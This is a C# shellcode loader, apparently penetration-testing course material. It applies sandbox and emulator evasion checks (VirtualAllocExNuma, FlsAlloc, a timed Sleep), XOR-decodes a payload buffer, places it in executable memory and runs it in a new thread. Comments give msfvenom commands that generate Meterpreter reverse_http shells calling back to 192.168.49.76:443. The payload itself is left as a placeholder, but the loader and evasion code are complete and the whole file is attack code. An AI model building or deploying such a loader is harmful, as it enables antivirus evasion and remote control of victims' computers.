using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace simplemet
{
    public class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint
        flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling =
        true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = false)]
        static extern IntPtr FlsAlloc(IntPtr callback);
        public static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4,
            0);
            if (mem == null)
            {
                return;
            }
            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null)
            {
                return;
            }
            //sleep evade in-memory scan, check fast forward in case exit and run
            var rand = new Random();
            uint check = (uint)rand.Next(10000, 20000);
            double stuff = check / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(check);
            if (DateTime.Now.Subtract(before).TotalSeconds < stuff)
            {
                return;
            }
            // X64 payload
            //msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.49.76 LPORT=443 EXITFUNC=thread - csharp > c64.sharp
            // X86 payload
            //msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.76 LPORT=443 EXITFUNC=thread -f csharp > c32.sharp
            // Xor 0xfa


	    byte[] buf = new byte[610] {INSERT THE PAYLOAD HERE};





            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            //We'll once again use the WaitForSingleObject API to let the shellcode finish execution. Otherwise, the Jscript execution would terminate the process before the shell becomes active.
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
